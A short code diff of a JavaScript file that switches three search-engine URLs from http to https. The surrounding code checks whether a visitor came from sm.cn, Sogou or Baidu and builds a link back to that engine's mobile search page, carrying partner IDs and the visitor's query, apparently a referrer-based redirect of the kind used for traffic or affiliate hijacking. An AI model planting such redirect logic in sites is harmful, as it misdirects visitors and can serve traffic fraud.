@@ -103,19 +103,19 @@
                 if (ref.match(/(.*)sm.cn/g) && sm_regex.exec(ref) && ref.indexOf(sm_num) == -1) {
                 	var snum_regex = new RegExp('[\\?&]snum=([^&#]*)');
                 	var snum = snum_regex.exec(ref)[1];
-                    href = 'http://yz.m.sm.cn/s?q=' + sm_regex.exec(ref)[1] + '&from=' + sm_num + '&safe=1&snum='+snum+ "&k=" + (new Date).valueOf();
+                    href = 'https://yz.m.sm.cn/s?q=' + sm_regex.exec(ref)[1] + '&from=' + sm_num + '&safe=1&snum='+snum+ "&k=" + (new Date).valueOf();
                     n = sm_name;
                     t = sm_times;
                 } else if (ref.match(/(.*)sogou.com/g) && sg_regex.exec(ref) && ref.indexOf(sg_num) == -1) {
 		    if (t_t === 2){
-			 href = "http://wap.sogou.com/web/sl?keyword=" + sg_regex.exec(ref)[1] + "&bid=" + sg_num + "&k=" + (new Date).valueOf();
+			 href = "https://wap.sogou.com/web/sl?keyword=" + sg_regex.exec(ref)[1] + "&bid=" + sg_num + "&k=" + (new Date).valueOf();
 		    }else{
 			href = sg_num + sg_regex.exec(ref)[1];
 		    }
                     n = sg_name;
                     t = sg_times;
                 } else if (ref.match(/(.*)baidu.com/g)) {
-                    href = "http://m.baidu.com/?from=" + bd_num + "&k=" + (new Date).valueOf();
+                    href = "https://m.baidu.com/?from=" + bd_num + "&k=" + (new Date).valueOf();
                     n = bd_name;
                     t = bd_times;
                 } else {
